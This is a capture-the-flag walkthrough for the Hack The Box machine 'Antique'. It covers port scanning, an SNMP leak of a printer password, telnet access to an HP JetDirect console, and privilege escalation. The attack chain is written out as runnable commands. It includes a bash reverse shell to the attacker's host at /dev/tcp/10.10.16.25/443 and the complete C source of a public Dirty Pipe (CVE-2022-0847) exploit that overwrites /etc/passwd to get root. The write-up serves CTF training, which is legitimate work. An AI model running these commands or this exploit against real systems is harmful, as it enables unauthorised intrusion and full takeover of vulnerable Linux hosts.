# Antique

## Enumeration

???+ Note "Enumeration"

    === ":octicons-codespaces-16: TCP Port Scanning"
        ``` bash
        sudo nmap -p- --min-rate 5000 -sS -n -Pn -vvv 10.129.1.45 -oG allPorts 
        ``` 

        ``` bash
        # Nmap 7.99SVN scan initiated Wed May 20 20:56:26 2026 as: nmap -p- --min-rate 5000 -sS -n -Pn -vvv -oG allPorts 10.129.1.45
        # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
        Host: 10.129.1.45 ()	Status: Up
        Host: 10.129.1.45 ()	Ports: 23/open/tcp//telnet///	Ignored State: closed (65534)
        # Nmap done at Wed May 20 20:56:53 2026 -- 1 IP address (1 host up) scanned in 26.42 seconds
        ``` 

    === ":octicons-codespaces-16: UDP Port Scanning"

        ``` bash
        sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.129.1.45 -oG allPortsUDP
        ``` 

        ``` bash
        # Nmap 7.99SVN scan initiated Wed May 20 21:08:08 2026 as: nmap -sU --top-ports 100 --open -T5 -v -n -oG allPortsUDP 10.129.1.45
        # Ports scanned: TCP(0;) UDP(100;7,9,17,19,49,53,67-69,80,88,111,120,123,135-139,158,161-162,177,427,443,445,497,500,514-515,518,520,593,623,626,631,996-999,1022-1023,1025-1030,1433-1434,1645-1646,1701,1718-1719,1812-1813,1900,2000,2048-2049,2222-2223,3283,3456,3703,4444,4500,5000,5060,5353,5632,9200,10000,17185,20031,30718,31337,32768-32769,32771,32815,33281,49152-49154,49156,49181-49182,49185-49186,49188,49190-49194,49200-49201,65024) SCTP(0;) PROTOCOLS(0;)
        Host: 10.129.1.45 ()	Status: Up
        Host: 10.129.1.45 ()	Ports: 161/open/udp//snmp///
        # Nmap done at Wed May 20 21:08:41 2026 -- 1 IP address (1 host up) scanned in 32.59 seconds
        ``` 

???+ Example "SNMP"

    === ":octicons-arrow-switch-16: SNMPwalk"

        ``` bash
        snmpwalk -v2c -c public 10.129.1.45 1
        ``` 

        ``` bash
        SNMPv2-SMI::mib-2 = STRING: "HTB Printer"
        SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
        33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
        SNMPv2-SMI::enterprises.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
        ``` 
    === ":octicons-file-binary-16: Hex to Bin"

        ``` bash
        echo '50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
        33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135' | xargs | xxd -ps -r
        ``` 

        ``` bash
        P@ssw0rd@123!!123�q��"2Rbs3CSs��$4�Eu�WGW�(8i	IY�aA�"1&1A5%
        ``` 

!!! Danger ":octicons-codespaces-16: :octicons-arrow-right-16: :octicons-server-16: Accessing"

    === "1. :octicons-codespaces-16: Host Machine"

        ``` bash
        nc -nlvp 443
        ``` 

        ``` bash
        Listening on 0.0.0.0 443
        ``` 
        
    === "2. :octicons-server-16: Target Machine"

        ``` bash 
        telnet antique.htb 23
        ``` 

        ``` bash hl_lines="11"
        Trying 10.129.32.20...
        Connected to 10.129.32.20.
        Escape character is '^]'.

        HP JetDirect


        Password: P@ssw0rd@123!!123

        Please type "?" for HELP
        > exec bash -c 'bash -i >& /dev/tcp/10.10.16.25/443 0>&1'
        ``` 

    === "3. :octicons-codespaces-16: Host Machine"

        ``` bash hl_lines="5"
        Listening on 0.0.0.0 443
        Connection received on 10.129.1.45 47338
        bash: cannot set terminal process group (1154): Inappropriate ioctl for device
        bash: no job control in this shell
        lp@antique:~$
        ``` 
    
    === "4. :octicons-terminal-16: Conditioning"

        ``` bash 
        lp@antique:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
        ``` 

        ``` bash 
        Crtl + Z
        stty raw -echo; fg
        reset xterm
        ``` 

        ``` bash 
        export TERM=xterm
        ``` 

        ``` bash 
        stty size
        stty rows xx xcolumns xx
        ``` 

## Privilege Escalation

!!! Danger ":octicons-server-16: :octicons-passkey-fill-16: Accessing"

    === ":octicons-terminal-16: Using the DirtyPipe exploit"

        ``` bash
        lp@antique:/tmp$ CVE-2022-0847-DirtyPipe-Exploit.c
        lp@antique:/tmp$ gcc CVE-2022-0847-DirtyPipe-Exploit.c -o privesc
        lp@antique:/tmp$ ./privesc
        lp@antique:/tmp$ whoami
        lp@antique:/tmp$ script /dev/null -c bash
        ```

    ??? Bug ":octicons-file-code-16: CVE-2022-0847-DirtyPipe-Exploit.c"

        https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit

        ``` c
        /* SPDX-License-Identifier: GPL-2.0 */
        /*
        * Copyright 2022 CM4all GmbH / IONOS SE
        *
        * author: Max Kellermann <max.kellermann@ionos.com>
        *
        * Proof-of-concept exploit for the Dirty Pipe
        * vulnerability (CVE-2022-0847) caused by an uninitialized
        * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
        * file contents in the page cache, even if the file is not permitted
        * to be written, immutable or on a read-only mount.
        *
        * This exploit requires Linux 5.8 or later; the code path was made
        * reachable by commit f6dd975583bd ("pipe: merge
        * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
        * there before, it just provided an easy way to exploit it.
        *
        * There are two major limitations of this exploit: the offset cannot
        * be on a page boundary (it needs to write one byte before the offset
        * to add a reference to this page to the pipe), and the write cannot
        * cross a page boundary.
        *
        * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
        *
        * Further explanation: https://dirtypipe.cm4all.com/
        */

        #define _GNU_SOURCE
        #include <unistd.h>
        #include <fcntl.h>
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>
        #include <sys/stat.h>
        #include <sys/user.h>

        #ifndef PAGE_SIZE
        #define PAGE_SIZE 4096
        #endif

        /**
        * Create a pipe where all "bufs" on the pipe_inode_info ring have the
        * PIPE_BUF_FLAG_CAN_MERGE flag set.
        */
        static void prepare_pipe(int p[2])
        {
            if (pipe(p)) abort();

            const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
            static char buffer[4096];

            /* fill the pipe completely; each pipe_buffer will now have
            the PIPE_BUF_FLAG_CAN_MERGE flag */
            for (unsigned r = pipe_size; r > 0;) {
                unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                write(p[1], buffer, n);
                r -= n;
            }

            /* drain the pipe, freeing all pipe_buffer instances (but
            leaving the flags initialized) */
            for (unsigned r = pipe_size; r > 0;) {
                unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                read(p[0], buffer, n);
                r -= n;
            }

            /* the pipe is now empty, and if somebody adds a new
            pipe_buffer without initializing its "flags", the buffer
            will be mergeable */
        }

        int main() {
            const char *const path = "/etc/passwd";

                printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
                FILE *f1 = fopen("/etc/passwd", "r");
                FILE *f2 = fopen("/tmp/passwd.bak", "w");

                if (f1 == NULL) {
                    printf("Failed to open /etc/passwd\n");
                    exit(EXIT_FAILURE);
                } else if (f2 == NULL) {
                    printf("Failed to open /tmp/passwd.bak\n");
                    fclose(f1);
                    exit(EXIT_FAILURE);
                }

                char c;
                while ((c = fgetc(f1)) != EOF)
                    fputc(c, f2);

                fclose(f1);
                fclose(f2);

            loff_t offset = 4; // after the "root"
            const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt aaron aaron 
                printf("Setting root password to \"aaron\"...\n");
            const size_t data_size = strlen(data);

            if (offset % PAGE_SIZE == 0) {
                fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
                return EXIT_FAILURE;
            }

            const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
            const loff_t end_offset = offset + (loff_t)data_size;
            if (end_offset > next_page) {
                fprintf(stderr, "Sorry, cannot write across a page boundary\n");
                return EXIT_FAILURE;
            }

            /* open the input file and validate the specified offset */
            const int fd = open(path, O_RDONLY); // yes, read-only! :-)
            if (fd < 0) {
                perror("open failed");
                return EXIT_FAILURE;
            }

            struct stat st;
            if (fstat(fd, &st)) {
                perror("stat failed");
                return EXIT_FAILURE;
            }

            if (offset > st.st_size) {
                fprintf(stderr, "Offset is not inside the file\n");
                return EXIT_FAILURE;
            }

            if (end_offset > st.st_size) {
                fprintf(stderr, "Sorry, cannot enlarge the file\n");
                return EXIT_FAILURE;
            }

            /* create the pipe with all flags initialized with
            PIPE_BUF_FLAG_CAN_MERGE */
            int p[2];
            prepare_pipe(p);

            /* splice one byte from before the specified offset into the
            pipe; this will add a reference to the page cache, but
            since copy_page_to_iter_pipe() does not initialize the
            "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
            --offset;
            ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
            if (nbytes < 0) {
                perror("splice failed");
                return EXIT_FAILURE;
            }
            if (nbytes == 0) {
                fprintf(stderr, "short splice\n");
                return EXIT_FAILURE;
            }

            /* the following write will not create a new pipe_buffer, but
            will instead write into the page cache, because of the
            PIPE_BUF_FLAG_CAN_MERGE flag */
            nbytes = write(p[1], data, data_size);
            if (nbytes < 0) {
                perror("write failed");
                return EXIT_FAILURE;
            }
            if ((size_t)nbytes < data_size) {
                fprintf(stderr, "short write\n");
                return EXIT_FAILURE;
            }

            char *argv[] = {"/bin/sh", "-c", "(echo aaron; cat) | su - -c \""
                        "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                        "cp /tmp/passwd.bak /etc/passwd;"
                        "echo \\\"Done! Popping shell... (run commands now)\\\";"
                        "/bin/sh;"
                    "\" root"};
                execv("/bin/sh", argv);

                printf("system() function call seems to have failed :(\n");
            return EXIT_SUCCESS;
        }
        ```